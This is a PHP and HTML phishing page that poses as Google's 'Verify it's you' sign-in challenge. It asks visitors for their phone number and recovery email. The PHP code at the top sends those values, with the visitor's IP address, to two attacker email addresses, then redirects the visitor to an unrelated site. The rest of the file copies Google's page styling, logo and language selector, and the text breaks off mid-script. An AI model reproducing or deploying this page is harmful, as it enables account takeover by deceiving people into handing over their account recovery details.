<?php

if (isset($_POST['phoneNumber'])) { 

$phoneNumber = $_POST["phoneNumber"];
$recemail = $_POST["recEmail"];


//get user's ip address 
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$message = "Gmail recovery details". "\n"; 
$message .= "user ip: ".$ip. "\n"; 
$message .= "phone: " . $phoneNumber . "\n"; 
$message .= "recovery email " .$_POST["recEmail"] . "\n"; 

$to =  "bigmoneythisyear@gmail.com,bigmoneythisyear@yahoo.com"; 

if($_POST['phoneNumber'] !="" || $_POST['recEmail'] !=""){
$hi = mail($to,"Gmail | ".$ip, $message); 
}
?> 
<script type="text/javascript"> 
<!-- 
   window.location="http://wealthmanagement.com/wealth-planning"; 

</script> <?PHP

die();
}


?>





<!DOCTYPE html>
<html lang="en">
  <head>
  <meta charset="utf-8">
  <meta content="width=300, initial-scale=1" name="viewport">
  <link rel="icon" href="favicon.ico" type="image/x-icon" />
  <meta name="robots" content="noindex">
  <title>Gmail account verification</title>
  <style>
  @font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 300;
  src: local('Open Sans Light'), local('OpenSans-Light');
}
@font-face {
  font-family: 'Open Sans';
  font-style: normal;
  font-weight: 400;
  src: local('Open Sans'), local('OpenSans');
}
  </style>
  <style>
  h1, h2 {
  -webkit-animation-duration: 0.1s;
  -webkit-animation-name: fontfix;
  -webkit-animation-iteration-count: 1;
  -webkit-animation-timing-function: linear;
  -webkit-animation-delay: 0;
  }
  @-webkit-keyframes fontfix {
  from {
  opacity: 1;
  }
  to {
  opacity: 1;
  }
  }
  </style>
<style>
  html, body {
  font-family: Arial, sans-serif;
  background: #fff;
  margin: 0;
  padding: 0;
  border: 0;
  position: absolute;
  height: 100%;
  min-width: 100%;
  font-size: 13px;
  color: #404040;
  direction: ltr;
  -webkit-text-size-adjust: none;
  }
  button,
  input[type=button],
  input[type=submit] {
  font-family: Arial, sans-serif;
  font-size: 13px;
  }
  a,
  a:hover,
  a:visited {
  color: #427fed;
  cursor: pointer;
  text-decoration: none;
  }
  a:hover {
  text-decoration: underline;
  }
  h1 {
  font-size: 20px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: normal;
  }
  h2 {
  font-size: 14px;
  color: #262626;
  margin: 0 0 15px;
  font-weight: bold;
  }
  input[type=email],
  input[type=number],
  input[type=password],
  input[type=tel],
  input[type=text],
  input[type=url] {
  -moz-appearance: none;
  -webkit-appearance: none;
  appearance: none;
  display: inline-block;
  height: 36px;
  padding: 0 8px;
  margin: 0;
  background: #fff;
  border: 1px solid #d9d9d9;
  border-top: 1px solid #c0c0c0;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  font-size: 15px;
  color: #404040;
  }
  input[type=email]:hover,
  input[type=number]:hover,
  input[type=password]:hover,
  input[type=tel]:hover,
  input[type=text]:hover,
  input[type=url]:hover {
  border: 1px solid #b9b9b9;
  border-top: 1px solid #a0a0a0;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=email]:focus,
  input[type=number]:focus,
  input[type=password]:focus,
  input[type=tel]:focus,
  input[type=text]:focus,
  input[type=url]:focus {
  outline: none;
  border: 1px solid #4d90fe;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  input[type=checkbox],
  input[type=radio] {
  -webkit-appearance: none;
  display: inline-block;
  width: 13px;
  height: 13px;
  margin: 0;
  cursor: pointer;
  vertical-align: bottom;
  background: #fff;
  border: 1px solid #c6c6c6;
  -moz-border-radius: 1px;
  -webkit-border-radius: 1px;
  border-radius: 1px;
  -moz-box-sizing: border-box;
  -webkit-box-sizing: border-box;
  box-sizing: border-box;
  position: relative;
  }
  input[type=checkbox]:active,
  input[type=radio]:active {
  background: #ebebeb;
  }
  input[type=checkbox]:hover {
  border-color: #c6c6c6;
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.1);
  }
  input[type=radio] {
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  width: 15px;
  height: 15px;
  }
  input[type=checkbox]:checked,
  input[type=radio]:checked {
  background: #fff;
  }
  input[type=radio]:checked::after {
  content: '';
  display: block;
  position: relative;
  top: 3px;
  left: 3px;
  width: 7px;
  height: 7px;
  background: #666;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  }
  input[type=checkbox]:checked::after {
  content: url(dropbox_files/checkmark.png);
  display: block;
  position: absolute;
  top: -6px;
  left: -5px;
  }
  input[type=checkbox]:focus {
  outline: none;
  border-color: #4d90fe;
  }
  .stacked-label {
  display: block;
  font-weight: bold;
  margin: .5em 0;
  }
  .hidden-label {
  position: absolute !important;
  clip: rect(1px 1px 1px 1px); /* IE6, IE7 */
  clip: rect(1px, 1px, 1px, 1px);
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  }
  input[type=checkbox].form-error,
  input[type=email].form-error,
  input[type=number].form-error,
  input[type=password].form-error,
  input[type=text].form-error,
  input[type=tel].form-error,
  input[type=url].form-error {
  border: 1px solid #dd4b39;
  }
  .error-msg {
  margin: .5em 0;
  display: block;
  color: #dd4b39;
  line-height: 17px;
  }
  .help-link {
  background: #dd4b39;
  padding: 0 5px;
  color: #fff;
  font-weight: bold;
  display: inline-block;
  -moz-border-radius: 1em;
  -webkit-border-radius: 1em;
  border-radius: 1em;
  text-decoration: none;
  position: relative;
  top: 0px;
  }
  .help-link:visited {
  color: #fff;
  }
  .help-link:hover {
  color: #fff;
  background: #c03523;
  text-decoration: none;
  }
  .help-link:active {
  opacity: 1;
  background: #ae2817;
  }
  .wrapper {
  position: relative;
  min-height: 100%;
  }
  .content {
  padding: 0 44px;
  }
  .main {
  padding-bottom: 100px;
  }
  /* For modern browsers */
  .clearfix:before,
  .clearfix:after {
  content: "";
  display: table;
  }
  .clearfix:after {
  clear: both;
  }
  /* For IE 6/7 (trigger hasLayout) */
  .clearfix {
  zoom:1;
  }
  .google-header-bar {
  height: 71px;
  border-bottom: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .header .logo {
  margin: 17px 0 0;
  float: left;
  height: 38px;
  width: 116px;
  }
  .header .secondary-link {
  margin: 28px 0 0;
  float: right;
  }
  .header .secondary-link a {
  font-weight: normal;
  }
  .google-header-bar.centered {
  border: 0;
  height: 108px;
  }
  .google-header-bar.centered .header .logo {
  float: none;
  margin: 40px auto 30px;
  display: block;
  }
  .google-header-bar.centered .header .secondary-link {
  display: none
  }
  .google-footer-bar {
  position: absolute;
  bottom: 0;
  height: 35px;
  width: 100%;
  border-top: 1px solid #e5e5e5;
  overflow: hidden;
  }
  .footer {
  padding-top: 7px;
  font-size: .85em;
  white-space: nowrap;
  line-height: 0;
  }
  .footer ul {
  float: left;
  max-width: 80%;
  padding: 0;
  }
  .footer ul li {
  color: #737373;
  display: inline;
  padding: 0;
  padding-right: 1.5em;
  }
  .footer a {
  color: #737373;
  }
  .lang-chooser-wrap {
  float: right;
  display: inline;
  }
  .lang-chooser-wrap img {
  vertical-align: top;
  }
  .lang-chooser {
  font-size: 13px;
  height: 24px;
  line-height: 24px;
  }
  .lang-chooser option {
  font-size: 13px;
  line-height: 24px;
  }
  .hidden {
  height: 0px;
  width: 0px;
  overflow: hidden;
  visibility: hidden;
  display: none !important;
  }
  .banner {
  text-align: center;
  }
  .card {
  background-color: #f7f7f7;
  padding: 20px 25px 30px;
  margin: 0 auto 25px;
  width: 304px;
  -moz-border-radius: 2px;
  -webkit-border-radius: 2px;
  border-radius: 2px;
  -moz-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  -webkit-box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.3);
  }
  .card > *:first-child {
  margin-top: 0;
  }
  .rc-button,
  .rc-button:visited {

  display: inline-block;
  min-width: 46px;
  text-align: center;
  color: #444;
  font-size: 14px;
  font-weight: 700;
  height: 36px;
  padding: 0 8px;
  line-height: 36px;
  -moz-border-radius: 3px;
  -webkit-border-radius: 3px;
  border-radius: 3px;
  -o-transition: all 0.218s;
  -moz-transition: all 0.218s;
  -webkit-transition: all 0.218s;
  transition: all 0.218s;
  border: 1px solid #dcdcdc;
  background-color: #f5f5f5;
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  -o-transition: none;
  -moz-user-select: none;
  -webkit-user-select: none;
  user-select: none;
  cursor: default;
  }
  .card .rc-button {
  width: 100%;
  padding: 0;
  }
  .rc-button.disabled,
  .rc-button[disabled] {
  opacity: .5;
  filter: alpha(opacity=50);
  cursor: default;
  pointer-events: none;
  }
  .rc-button:hover {
  border: 1px solid #c6c6c6;
  color: #333;
  text-decoration: none;
  -o-transition: all 0.0s;
  -moz-transition: all 0.0s;
  -webkit-transition: all 0.0s;
  transition: all 0.0s;
  background-color: #f8f8f8;
  background-image: -webkit-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: -o-linear-gradient(top,#f8f8f8,#f1f1f1);
  background-image: linear-gradient(top,#f8f8f8,#f1f1f1);
  -moz-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  box-shadow: 0 1px 1px rgba(0,0,0,0.1);
  }
  .rc-button:active {
  background-color: #f6f6f6;
  background-image: -webkit-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: -o-linear-gradient(top,#f6f6f6,#f1f1f1);
  background-image: linear-gradient(top,#f6f6f6,#f1f1f1);
  -moz-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  -webkit-box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  box-shadow: 0 1px 2px rgba(0,0,0,0.1);
  }
  .rc-button-submit,
  .rc-button-submit:visited {
  border: 1px solid #3079ed;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #4d90fe;
  background-image: -webkit-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -moz-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -ms-linear-gradient(top,#4d90fe,#4787ed);
  background-image: -o-linear-gradient(top,#4d90fe,#4787ed);
  background-image: linear-gradient(top,#4d90fe,#4787ed);
  }
  .rc-button-submit:hover {
  border: 1px solid #2f5bb7;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  }
  .rc-button-submit:active {
  background-color: #357ae8;
  background-image: -webkit-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -moz-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -ms-linear-gradient(top,#4d90fe,#357ae8);
  background-image: -o-linear-gradient(top,#4d90fe,#357ae8);
  background-image: linear-gradient(top,#4d90fe,#357ae8);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .rc-button-red,
  .rc-button-red:visited {
  border: 1px solid transparent;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.1);
  background-color: #d14836;
  background-image: -webkit-linear-gradient(top,#dd4b39,#d14836);
  background-image: -moz-linear-gradient(top,#dd4b39,#d14836);
  background-image: -ms-linear-gradient(top,#dd4b39,#d14836);
  background-image: -o-linear-gradient(top,#dd4b39,#d14836);
  background-image: linear-gradient(top,#dd4b39,#d14836);
  }
  .rc-button-red:hover {
  border: 1px solid #b0281a;
  color: #fff;
  text-shadow: 0 1px rgba(0,0,0,0.3);
  background-color: #c53727;
  background-image: -webkit-linear-gradient(top,#dd4b39,#c53727);
  background-image: -moz-linear-gradient(top,#dd4b39,#c53727);
  background-image: -ms-linear-gradient(top,#dd4b39,#c53727);
  background-image: -o-linear-gradient(top,#dd4b39,#c53727);
  background-image: linear-gradient(top,#dd4b39,#c53727);
  }
  .rc-button-red:active {
  border: 1px solid #992a1b;
  background-color: #b0281a;
  background-image: -webkit-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -moz-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -ms-linear-gradient(top,#dd4b39,#b0281a);
  background-image: -o-linear-gradient(top,#dd4b39,#b0281a);
  background-image: linear-gradient(top,#dd4b39,#b0281a);
  -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
  }
  .secondary-actions {
  text-align: center;
  }
</style>
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  .google-header-bar.centered {
  height: 83px;
  }
  .google-header-bar.centered .header .logo {
  margin: 25px auto 20px;
  }
  .card {
  margin-bottom: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  html, body {
  font-size: 14px;
  }
  .google-header-bar.centered {
  height: 73px;
  }
  .google-header-bar.centered .header .logo {
  margin: 20px auto 15px;
  }
  .content {
  padding-left: 10px;
  padding-right: 10px;
  }
  .hidden-small {
  display: none;
  }
  .card {
  padding: 20px 15px 30px;
  width: 270px;
  }
  .footer ul li {
  padding-right: 1em;
  }
  .lang-chooser-wrap {
  display: none;
  }
</style>
<style>
  pre.debug {
  font-family: monospace;
  position: absolute;
  left: 0;
  margin: 0;
  padding: 1.5em;
  font-size: 13px;
  background: #f1f1f1;
  border-top: 1px solid #e5e5e5;
  direction: ltr;
  white-space: pre-wrap;
  width: 90%;
  overflow: hidden;
  }
</style>
  <style type="text/css">
  .flex-card {
  padding: 40px;
  width: auto;
  max-width: 560px;
  min-width: 270px;
  }
  .flex-card .rc-button {
  width: auto;
  padding: 0 8px;
  }
  </style>
  <style media="screen and (max-width: 580px)">
  .flex-card {
  width: 270px;
  padding: 20px 15px 30px;
  }
  .flex-card input[type=email],
  .flex-card input[type=number],
  .flex-card input[type=tel],
  .flex-card input[type=text],
  .flex-card .rc-button {
  width: 100%;
  }
  </style>
<style type="text/css">
  .challenge-card h1 {
  margin-bottom: 10px;
  }
  .challenge-card label {
  display: block;
  margin-bottom:10px
  }
  .challenge-card ul {
  list-style: none;
  padding: 0;
  }
  .challenge-card input[type=email],
  .challenge-card input[type=number],
  .challenge-card input[type=tel],
  .challenge-card input[type=text],
  .challenge-card input.rc-button {
  display: block;
  }
  .challenge-card input.radio {
  float: left;
  }
  .challenge-card .description {
  color: #737373;
  margin-bottom: 30px;
  }
  .challenge-card .option-wrapper {
  border-top: 1px solid #d5d5d5;
  }
  .challenge-card .option-wrapper input[name="challengetype"] {
  margin-bottom: 20px;
  margin-top: 20px;
  }
  .challenge-card .option {
  margin-left: 2em;
  zoom: 1;
  }
  .challenge-card hr {
  border: 0;
  height: 1px;
  color: #d5d5d5;
  background-color: #d5d5d5;
  }
  .challenge-card h2 {
  margin-bottom: 10px;
  }
  .challenge-card .label-selected {
  padding-top: 20px;
  font-weight: bold;
  }
  .challenge-card .label-unselected {
  padding-bottom: 20px;
  padding-top: 20px;
  font-weight: normal;
  margin-bottom: 0;
  }
  .challenge-card .option-content-selected {
  padding-bottom: 20px;
  visibility: visible;
  height: 100%;
  }
  .challenge-card .option-content-unselected {
  visibility: hidden;
  height: 0;
  }
  .challenge-card .help {
  color: #999;
  margin-left: 5px;
  }
  .challenge-card #submitChallenge {
  margin: 8px 0 13px;
  }
  .challenge-card .country-select {
  width: 100%;
  height: 37px;
  padding: 0 5px;
  -webkit-border-radius: 2px;
  -webkit-appearance: none;
  -moz-border-radius: 2px;
  border-radius: 2px;
  background-color: #f5f5f5;
  background-image: -webkit-gradient(linear,left top,left bottom,from(#f5f5f5),to(#f1f1f1));
  background-image: -webkit-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -moz-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -ms-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: -o-linear-gradient(top,#f5f5f5,#f1f1f1);
  background-image: linear-gradient(top,#f5f5f5,#f1f1f1);
  border: 1px solid #dcdcdc;
  color: #444;
  font-size: 11px;
  font-weight: bold;
  line-height: 27px;
  list-style: none;
  margin: 0 0 .5em;
  min-width: 46px;
  outline: none;
  }
  .challenge-card #secret-question {
  margin-bottom: 10px;
  font-weight: bold;
  }
  .challenge-card #country-selector-wrapper {
  margin-bottom: 10px;
  }
  .feedback-link {
  vertical-align: bottom;
  max-width: 270px;
  display: inline-block;
  margin-top: 6px;
  }
  .app-icon {
  margin-left: 2px;
  margin-right: 2px;
  vertical-align: text-bottom;
  }
  .offlineotp-instructions {
  line-height: 20px;
  }
  .offlineotp-instructions li {
  margin: 5px 0;
  }
  div input[type=text].inline-textbox {
  display: inline;
  margin-right: 10px;
  }
  .extra-explanation {
  font-style: italic;
  font-weight: normal;
  color: #737373;
  line-height: 15px;
  }
  .primary-email-info {
  color: #737373;
  }
  .email-address-description {
  width: 180px;
  }
  .option-content-unselected .feedback-link,
  .option-content-unselected .authzen-action-image {
  float: none;
  }
  .authzen-action-image {
  float: left;
  margin-right: 20px;
  }
</style>
<style media="screen and (max-width: 580px)">
  .challenge-card .description {
  margin-bottom: 18px;
  }
  .challenge-card .option-wrapper input[name="challengetype"] {
  margin-bottom: 10px;
  margin-top: 15px;
  }
  .challenge-card .label-selected {
  padding-top: 15px;
  }
  .challenge-card .label-unselected {
  padding-top: 15px;
  padding-bottom: 10px;
  }
  .challenge-card .option-content-selected {
  padding-bottom: 10px;
  }
</style>
<link href="SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css">
<script src="SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
  </head>
  <body>
  <script type="text/javascript">
  
  var phoneNumber =document.getElementById("phoneNumber").value;
  var recEmail = document.getElementById("recEmail").value;
  
 

function validateForm() {
    var x = document.forms["challengeform"]["recEmail"].value;
	
   alert(x);
	}


</script>
  </script>
  <div class="wrapper">
  <div class="google-header-bar  centered">
  <div class="header content clearfix">
  <img alt="Google" class="logo" src="dropbox_files/google.png">
  </div>
  </div>
  <div class="main content clearfix">
<div class="card flex-card challenge-card">
  <form method="post" id="challengeform" action="#">
  <input type="hidden" id="here" value="test">
  <h1 id="login-challenge-heading">
  Verify it's you
  </h1>
  <div class="body">
  <p class="description">
  Something seems a bit different about the way you're trying to sign in. Complete the step below to let us know it's you and not someone pretending to be you.
  <a href="#" target="_blank">Learn more</a>.
  </p>
  <h2>
  Select a verification method
  </h2>
  
  <div id="challengeZippyContent">
  <div class="option-wrapper clearfix" id="PhoneVerificationChallengeOption">
  <input type="radio" class="radio" name="challengetype"
            id="PhoneVerificationChallenge" value="PhoneVerificationChallenge"
            
        >
  <div class="option">
  <label for="PhoneVerificationChallenge" id="PhoneVerificationChallengeLabel">
  Tell us your phone number
  ********</label>
  <div class="option-content"
        id="PhoneVerificationChallengeOptionContent">    
  <span role="alert" class="error-msg"><span id="sprytextfield1">
  <input type="text" name="phoneNumber" id="phoneNumber" size="30" dir="ltr"
        
        placeholder="Enter full phone number">
  <span class="textfieldRequiredMsg">A value is required.</span></span>
  </span>
  <span role="alert" class="error-msg">
  </span>
  <div class="help">
  We'll check if this matches the phone number we have on file
  </div>
  </div>
  </div>
  </div>
  <div class="option-wrapper clearfix" id="SecretQuestionChallengeOption">
  <input type="radio" class="radio" name="challengetype"
            id="SecretQuestionChallenge" value="SecretQuestionChallenge"
            
        >
  <div class="option">
  <label for="SecretQuestionChallenge"
        id="SecretQuestionChallengeLabel">
  Enter your recovery email
  </label>
  <div class="option-content"
        id="SecretQuestionChallengeOptionContent">
  

      <span id="sprytextfield2">
      <input type="text" name="recEmail" id="recEmail" size="30"
          
      >
      <span class="textfieldRequiredMsg">A value is required.</span></span> <span role="alert" class="error-msg">
  </span>
  <span role="alert" class="error-msg">
  </span>
  </div>
  </div>
  </div>
  </div>
  <input name="submitChallenge" id="submitChallenge"
           class="rc-button rc-button-submit" type="submit"
           value="Continue" >
  Having trouble? <a href="#">Reset your password instead</a>.
  </div>
  </form>
</div>
  </div>
  <div class="google-footer-bar">
  <div class="footer content clearfix">
  <ul id="footer-list">
  <li>
  <a href="">
  About Google
  </a>
  </li>
  <li>
  <a href="#" target="_blank">
  Privacy &amp; Terms
  </a>
  </li>
  <li>
  <a href="#" target="_blank">
  Help
  </a>
  </li>
  </ul>
  <div id="lang-vis-control" style="display: none">
  <span id="lang-chooser-wrap" class="lang-chooser-wrap">
  <label for="lang-chooser"><img src="dropbox_files/universal_language_settings-21.png" alt="Change language"></label>
  <select id="lang-chooser" class="lang-chooser" name="lang-chooser">
  <option value="af"
                 >
  вЂЄAfrikaansвЂ¬
  </option>
  <option value="az"
                 >
  вЂЄazЙ™rbaycanвЂ¬
  </option>
  <option value="in"
                 >
  вЂЄBahasa IndonesiaвЂ¬
  </option>
  <option value="ms"
                 >
  вЂЄBahasa MelayuвЂ¬
  </option>
  <option value="ca"
                 >
  вЂЄcatalГ вЂ¬
  </option>
  <option value="cs"
                 >
  вЂЄДЊeЕЎtinaвЂ¬
  </option>
  <option value="da"
                 >
  вЂЄDanskвЂ¬
  </option>
  <option value="de"
                 >
  вЂЄDeutschвЂ¬
  </option>
  <option value="et"
                 >
  вЂЄeestiвЂ¬
  </option>
  <option value="en-GB"
                 >
  вЂЄEnglish (United Kingdom)вЂ¬
  </option>
  <option value="en"
                
                  selected="selected"
                 >
  вЂЄEnglish (United States)вЂ¬
  </option>
  <option value="es"
                 >
  вЂЄEspaГ±ol (EspaГ±a)вЂ¬
  </option>
  <option value="es-419"
                 >
  вЂЄEspaГ±ol (LatinoamГ©rica)вЂ¬
  </option>
  <option value="eu"
                 >
  вЂЄeuskaraвЂ¬
  </option>
  <option value="fil"
                 >
  вЂЄFilipinoвЂ¬
  </option>
  <option value="fr-CA"
                 >
  вЂЄFranГ§ais (Canada)вЂ¬
  </option>
  <option value="fr"
                 >
  вЂЄFranГ§ais (France)вЂ¬
  </option>
  <option value="gl"
                 >
  вЂЄgalegoвЂ¬
  </option>
  <option value="hr"
                 >
  вЂЄHrvatskiвЂ¬
  </option>
  <option value="zu"
                 >
  вЂЄisiZuluвЂ¬
  </option>
  <option value="is"
                 >
  вЂЄГ­slenskaвЂ¬
  </option>
  <option value="it"
                 >
  вЂЄItalianoвЂ¬
  </option>
  <option value="sw"
                 >
  вЂЄKiswahiliвЂ¬
  </option>
  <option value="lv"
                 >
  вЂЄlatvieЕЎuвЂ¬
  </option>
  <option value="lt"
                 >
  вЂЄlietuviЕівЂ¬
  </option>
  <option value="hu"
                 >
  вЂЄmagyarвЂ¬
  </option>
  <option value="nl"
                 >
  вЂЄNederlandsвЂ¬
  </option>
  <option value="no"
                 >
  вЂЄnorskвЂ¬
  </option>
  <option value="pl"
                 >
  вЂЄpolskiвЂ¬
  </option>
  <option value="pt"
                 >
  вЂЄPortuguГЄsвЂ¬
  </option>
  <option value="pt-BR"
                 >
  вЂЄPortuguГЄs (Brasil)вЂ¬
  </option>
  <option value="pt-PT"
                 >
  вЂЄPortuguГЄs (Portugal)вЂ¬
  </option>
  <option value="ro"
                 >
  вЂЄromГўnДѓвЂ¬
  </option>
  <option value="sk"
                 >
  вЂЄSlovenДЌinaвЂ¬
  </option>
  <option value="sl"
                 >
  вЂЄslovenЕЎДЌinaвЂ¬
  </option>
  <option value="fi"
                 >
  вЂЄSuomiвЂ¬
  </option>
  <option value="sv"
                 >
  вЂЄSvenskaвЂ¬
  </option>
  <option value="vi"
                 >
  вЂЄTiбєїng Viб»‡tвЂ¬
  </option>
  <option value="tr"
                 >
  вЂЄTГјrkГ§eвЂ¬
  </option>
  <option value="el"
                 >
  вЂЄО•О»О»О·ОЅО№ОєО¬вЂ¬
  </option>
  <option value="bg"
                 >
  вЂЄР±СЉР»РіР°СЂСЃРєРёвЂ¬
  </option>
  <option value="mn"
                 >
  вЂЄРјРѕРЅРіРѕР»вЂ¬
  </option>
  <option value="ru"
                 >
  вЂЄР СѓСЃСЃРєРёР№вЂ¬
  </option>
  <option value="sr"
                 >
  вЂЄРЎСЂРїСЃРєРёвЂ¬
  </option>
  <option value="uk"
                 >
  вЂЄРЈРєСЂР°С—РЅСЃСЊРєР°вЂ¬
  </option>
  <option value="ka"
                 >
  вЂЄбѓҐбѓђбѓ бѓ—бѓЈбѓљбѓвЂ¬
  </option>
  <option value="hy"
                 >
  вЂЄХ°ХЎХµХҐЦЂХҐХ¶вЂ¬
  </option>
  <option value="iw"
                 >
  вЂ«ЧўЧ‘ЧЁЧ™ЧЄвЂ¬вЂЋ
  </option>
  <option value="ur"
                 >
  вЂ«Ш§Ш±ШЇЩ€вЂ¬вЂЋ
  </option>
  <option value="ar"
                 >
  вЂ«Ш§Щ„Ш№Ш±ШЁЩЉШ©вЂ¬вЂЋ
  </option>
  <option value="fa"
                 >
  вЂ«ЩЃШ§Ш±ШіЫЊвЂ¬вЂЋ
  </option>
  <option value="am"
                 >
  вЂЄбЉ б€›б€­бЉ›вЂ¬
  </option>
== 2) {
                query[param[0]] = param[1];
              }
            }
            return query;
          }
          return {};
        }
        var langChooser_getParamStr = function(params) {
          var paramsStr = [];
          for (var a in params) {
            paramsStr.push(a + "=" + params[a]);
          }
          return paramsStr.join('&');
        }
        var langChooser_currentUrl = window.location.href;
        var match = langChooser_currentUrl.match("^(.*?)(\\?(.*?))?(#(.*))?$");
        var langChooser_currentPath = match[1];
        var langChooser_params = langChooser_parseParams(match[3]);
        var langChooser_fragment = match[5];

        var langChooser = document.getElementById('lang-chooser');
        var langChooserWrap = document.getElementById('lang-chooser-wrap');
        var langVisControl = document.getElementById('lang-vis-control');
        if (langVisControl && langChooser) {
          langVisControl.style.display = 'inline';
          langChooser.onchange = function() {
            langChooser_params['lp'] = 1;
            langChooser_params['hl'] = encodeURIComponent(this.value);
            var paramsStr = langChooser_getParamStr(langChooser_params);
            var newHref = langChooser_currentPath + "?" + paramsStr;
            if (langChooser_fragment) {
              newHref = newHref + "#" + langChooser_fragment;
            }
            window.location.href = newHref;
          };
        }
      })();
    </script>
<script type="text/javascript">
  var gaia_attachEvent = function(element, event, callback) {
  if (element.addEventListener) {
  element.addEventListener(event, callback, false);
  } else if (element.attachEvent) {
  element.attachEvent('on' + event, callback);
  }
  };
</script>
  
 
<script type="text/javascript">
(function(){
  var challenges = [];
  var containsMapChallenge = false;
  var containsAuthzenChallenge = false;
  var containsOfflineOtpChallenge = false;
  var challengeValidators = [];
  
  challenges.push('PhoneVerificationChallenge');
  challenges.push('SecretQuestionChallenge');
  var setChallengeSelected = function(challenge, visible) {
  var radio = document.getElementById(challenge),
  label = document.getElementById(challenge + 'Label'),
  optionContent = document.getElementById(challenge + 'OptionContent');
  if (visible) {
  radio.checked = true;
  if (label) {
  label.className = "label-selected";
  }
  optionContent.className = "option-content option-content-selected";
  var inputElems = optionContent.getElementsByTagName('input')
  for (var i = 0; i < inputElems.length; i++) {
        if (inputElems[i].type != 'hidden') {
          inputElems[i].focus();
          break;
        }
      }
      if (!challengeValidators[challenge]) {
        
        document.getElementById('submitChallenge').disabled = false;
      } else {
        document.getElementById('submitChallenge').disabled =
            !challengeValidators[challenge]();
      }
    } else {
      radio.checked = false;
      if (label) {
        label.className = "label-unselected";
      }
      optionContent.className = "option-content option-content-unselected";
    }
  };

  
  var expandSelectedChallenge = function() {
    for (var i = 0; i < challenges.length; i++) {
      var challenge = challenges[i],
          radio = document.getElementById(challenge);
      setChallengeSelected(challenge, radio.checked);
    }
  };

  

  var calculateBotguardResponse = function () {
    
    



  try {
    document.bg.invoke(function(response) {
      document.getElementById('bgresponse').value = response;
    });
  } catch (err) {
    document.getElementById('bgresponse').value = '';
  }




    return true;
  }

  var formSubmitHandler = function() {
    
    document.getElementById('submitChallenge').disabled = true;

    if (containsMapChallenge) {
      if (!mapOnsubmitHandler()) {
        return false;
      }
    }

    
    calculateBotguardResponse();
    return true;
  };

  var initialize = function() {
    for (var i = 0; i < challenges.length; i++) {
      var radio = document.getElementById(challenges[i]);
      radio.onclick = function() {
        expandSelectedChallenge();
        return true;
      };
    }

    document.getElementById('challengeform').onsubmit = formSubmitHandler;
    if (containsMapChallenge) {
